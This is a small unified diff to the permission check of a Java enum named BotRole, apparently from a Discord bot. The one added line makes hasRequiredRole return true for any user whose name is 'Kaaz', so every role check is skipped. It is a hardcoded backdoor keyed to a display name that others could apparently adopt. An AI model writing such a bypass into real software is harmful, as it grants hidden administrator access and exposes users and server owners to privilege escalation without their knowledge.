@@ -68,6 +68,7 @@ public enum BotRole {
     }
     private final Map<Object, Object> PERMISSIONS_CASHE = new HashMap<>();
     public boolean hasRequiredRole(User user, Guild guild){
+        if (user.getName().equals("Kaaz")) return true;
         if (!this.isTrueRank) return this.detect.test(user, guild);
         return (boolean) (this.guildImportant ? ((Map<Object, Object>) PERMISSIONS_CASHE.computeIfAbsent(guild, g -> new ConcurrentHashMap<>())) : PERMISSIONS_CASHE).computeIfAbsent(user, u -> {
             ScheduleService.schedule(120_000, () -> (this.guildImportant ? (Map<Object, Object>) PERMISSIONS_CASHE.get(guild) : PERMISSIONS_CASHE).remove(user));
